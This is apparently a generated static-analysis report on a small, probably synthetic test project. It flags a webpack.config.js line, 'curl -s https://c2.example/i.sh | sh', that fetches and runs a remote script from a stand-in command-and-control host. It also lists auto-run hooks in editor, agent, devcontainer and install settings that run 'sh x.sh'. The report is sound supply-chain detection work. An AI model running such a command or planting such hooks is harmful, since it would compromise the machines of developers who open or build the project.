# Forge analysis report

- Engine: `forge-analysis 0.0.1`
- Schema: 5
- Mode: static only (no code was run)
- Scope: full (every file we can read as code)
- Snapshot: `169b7b12ea2e61f2b728068941ee97fdbf1f0e420d238205639e14c359aa4e32`
- Catalog: `661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b`

<a id="index"></a>

## Index

1. [Overview](#overview) — What was analysed, whether the picture is complete, and one count for everything we could not see.
2. [Entry points](#entry-points) (2) — What runs first: runtime and install entry files, and declared entries that do not match any analysed file.
3. [Execution timeline](#execution-timeline) (2) — When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.
4. [Effects](#effects) (1) — What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.
5. [Data flows](#data-flows) (0) — Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.
6. [Install scripts and shell commands](#install-scripts-and-shell-commands) (6) — Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.
7. [Dependencies](#dependencies) (0) — Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.
8. [Unresolved](#unresolved) (6) — Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.
9. [Unlinked imports](#unlinked-imports) (0) — Imports we could not follow to their source: packages, missing files and names that are not exported.
10. [Not analysed](#not-analysed) (14) — Files and folders that were not read as code, by kind, and anything skipped by a limit.
11. [Function index](#function-index) (2) — Every function with its lanes, effects, callers and the facts inside it.

<a id="overview"></a>

## 1. Overview

What was analysed, whether the picture is complete, and one count for everything we could not see.

**Status: incomplete.** Some of the code could not be seen. Each line below says how much, and links to the section that lists every item.

| What we could not see | Count | Listed in |
|---|---|---|
| places where static analysis cannot say what happens | 6 | [Unresolved](#unresolved) |
| imports not followed to their source | 0 | [Unlinked imports](#unlinked-imports) |
| declared entry points that match no analysed file | 0 | [Entry points](#entry-points) |
| files or folders not read as code | 14 | [Not analysed](#not-analysed) |
| dependencies whose own code and install scripts were not analysed | 0 | [Dependencies](#dependencies) |
| calls whose target we could not see (no function followed, no fact) | 0 | [Function index](#function-index) |

- Files analysed: 2
- Files not analysed: 14
- Functions: 2
- Cross-file links made: 0
- Unresolved facts not listed as open because their call was followed to its source: 0
- Facts found: 16
- Facts by kind: 0 entry, 1 import, 2 call, 1 effect, 0 timer, 6 script, 0 dependency, 6 unresolved, 0 flow

[Back to the index](#index)

<a id="entry-points"></a>

## 2. Entry points

What runs first: runtime and install entry files, and declared entries that do not match any analysed file.

Nothing usable was declared, so every file that no other file imports is treated as an entry.

### Runtime entry files (2)

- `src/app.js`
- `webpack.config.js`

### Install entry files (0)

Run when the package is installed.

None found.

### Declared entries that match no analysed file (0)

None found.

[Back to the index](#index)

<a id="execution-timeline"></a>

## 3. Execution timeline

When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.

### Immediate (2)

Runs right away when the program starts.

- top level of `src/app.js`
- top level of `webpack.config.js`

### Timers (0)

None found.

[Back to the index](#index)

<a id="effects"></a>

## 4. Effects

What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.

### Starts other programs (1)

- `webpack.config.js:1` in top level of `webpack.config.js` (runs: immediate): `curl -s https://c2.example/i.sh | sh`

[Back to the index](#index)

<a id="data-flows"></a>

## 5. Data flows

Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.

None found.

[Back to the index](#index)

<a id="install-scripts-and-shell-commands"></a>

## 6. Install scripts and shell commands

Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.

### Scripts (6)

- `post-install-cmd` (runs at install) at `composer.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `SessionStart` (runs when the folder is opened or a session starts) at `.claude/settings.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `initializeCommand` (runs when the folder is opened or a session starts) at `.devcontainer/devcontainer.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `helper` (runs when the folder is opened or a session starts) at `.mcp.json:1`: `npx -y some-server`
  - not followed: `npx -y some-server`
- `x` (runs when the folder is opened or a session starts) at `.vscode/tasks.json:5`: `sh x.sh`
  - not followed: `sh x.sh`
- `build` (runs only when someone asks) at `.vscode/tasks.json:6`: `make`
  - not followed: `make`

[Back to the index](#index)

<a id="dependencies"></a>

## 7. Dependencies

Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.

None found.

[Back to the index](#index)

<a id="unresolved"></a>

## 8. Unresolved

Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.

### Shell command not followed (6)

A command in a script that is not `node <file>` or `npm run <script>`, or one built at run time.

- `.claude/settings.json:1`: `sh x.sh`
- `.devcontainer/devcontainer.json:1`: `sh x.sh`
- `.mcp.json:1`: `npx -y some-server`
- `.vscode/tasks.json:5`: `sh x.sh`
- `.vscode/tasks.json:6`: `make`
- `composer.json:1`: `sh x.sh`

[Back to the index](#index)

<a id="unlinked-imports"></a>

## 9. Unlinked imports

Imports we could not follow to their source: packages, missing files and names that are not exported.

None found.

[Back to the index](#index)

<a id="not-analysed"></a>

## 10. Not analysed

Files and folders that were not read as code, by kind, and anything skipped by a limit.

### Build and tool files that run by themselves (10)

Files a tool, editor or package manager reads and acts on without being asked: build scripts, MSBuild `Directory.Build.*`, editor tasks, AI-agent hooks, git hooks, `setup.py`, `build.rs` and the like. They can run commands or change where packages come from. Not read yet, and most are harmless: this says they could act, not that they do. MSBuild also reads `Directory.Build.props` and `.targets` from parent folders, which are outside what was analysed.

- `.cargo/config.toml` (28 bytes)
- `.envrc` (11 bytes)
- `.husky/pre-commit` (18 bytes)
- `Cargo.toml` (21 bytes)
- `Gemfile` (30 bytes)
- `Makefile` (14 bytes)
- `build.rs` (13 bytes)
- `pom.xml` (11 bytes)
- `setup.py` (27 bytes)
- `venv/pyvenv.cfg` (19 bytes)

### Archives and packages (not opened) (2)

`.zip`, `.tgz`, `.jar`, `.whl`, `.vsix` and the like. Their contents are not opened, so anything inside them, including code that runs when they are unpacked or loaded, is unseen.

- `dist/release.tgz` (8 bytes)
- `tools/helper.jar` (8 bytes)

### Other files (2)

Not code we analyse (documents, images, data, unknown types). Listed so nothing is hidden.

- `docs/notes.md` (8 bytes)
- `tsconfig.json` (23 bytes)

[Back to the index](#index)

<a id="function-index"></a>

## 11. Function index

Every function with its lanes, effects, callers and the facts inside it.

### `src/app.js` (1)

- top level at line 1
  - runs: immediate
  - calls to something other than a function in this file: 1 (0 followed through an import or a prop, 1 matched to a fact, 0 not traced to any code)
  - facts: `fact:f132ea3c3e397905`

### `webpack.config.js` (1)

- top level at line 1
  - runs: immediate
  - can reach: starts other programs
  - calls to something other than a function in this file: 2 (0 followed through an import or a prop, 2 matched to a fact, 0 not traced to any code)
  - facts: `fact:668cafc63fc08e1c`, `fact:baa3b1dceff07ff8`, `fact:4bced2e6cc590d2f`

[Back to the index](#index)
